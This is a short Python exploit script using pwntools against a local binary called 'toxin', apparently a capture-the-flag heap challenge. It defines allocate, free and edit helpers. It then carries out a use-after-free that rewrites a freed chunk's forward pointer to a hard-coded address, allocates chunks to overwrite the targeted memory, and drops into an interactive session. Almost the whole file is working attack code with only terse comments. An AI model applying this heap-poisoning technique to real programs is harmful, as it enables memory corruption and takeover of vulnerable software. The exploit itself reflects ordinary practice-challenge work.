from pwn import *

p = process("./toxin")

# 1. Add toxin    => Allocate chunk
def add_toxin(length,index,data):
    p.sendline("1")
    p.recv()
    p.sendline(str(length))
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(data)
    p.recv()
# 2. Drink toxin  => Free chunk
def drink_toxin(index):
    p.sendline("3")
    p.recv()
    p.sendline(str(index))
    p.recv()
# 3. Edit toxin   => Rewrite the fd of the freed chunk
def edit_toxin(index,data):
    p.sendline("2")
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(data)
    p.recv()

#add_toxin(100,0,"A"*8)
#drink_toxin(0)
#edit_toxin(0,"B"*8)
#add_toxin(100,1,'C'*8)

add_toxin(0x70,0,"A"*8)
drink_toxin(0)
edit_toxin(0,p64(0x55555555803d)) # toxinfreed - 19
add_toxin(100,1,"C"*8)
add_toxin(100,2,"D"*8 + "E"*8 + "F"*8 + "G" *8 ) # Overwriting

#gdb.attach(p)
p.interactive()
